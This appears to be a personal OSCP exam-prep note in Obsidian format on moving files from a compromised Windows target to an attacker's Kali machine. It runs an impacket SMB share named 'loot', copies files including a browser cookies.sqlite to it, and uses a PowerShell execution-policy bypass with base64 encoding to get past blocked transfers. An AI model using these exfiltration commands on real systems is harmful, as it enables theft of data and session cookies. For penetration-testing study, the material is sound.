## STEP 3 (CORRECT) – Use SMB to send file to Kali

### On **Kali**:

```
sudo impacket-smbserver loot . -smb2support
```

### Windows Target
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `copy C:\\\Users\\\[USER]\\\Desktop\\\[filename] \\\\${KaliIP}\\\loot\\\[filename]`;

dv.paragraph("```bash\n" + command + "\n```");
```


---

# Method 2

If target is blocking transfer (works for zip files (sharphound.zip))

#### 1. Encode file on Windows (`C.Bum`)

```
powershell -ep bypass
```

```
powershell -c "[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\[USER]\Desktop\[FILENAME]'))"
```

#### 2. Decode on Kali

Copy the Base64 output string from your terminal and save/decode it on Kali:

Bash

```
echo "<BASE64_STRING>" | base64 -d > target_file.txt
```

---
### On **Windows RDP**:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `copy C:\\Users\\Public\\cookies.sqlite \\\\${KaliIP}\\share\ `;

dv.paragraph("```bash\n" + command + "\n```");
```


✔ File now lands on Kali Desktop  
✔ No hosting on Windows  
✔ No firewall problems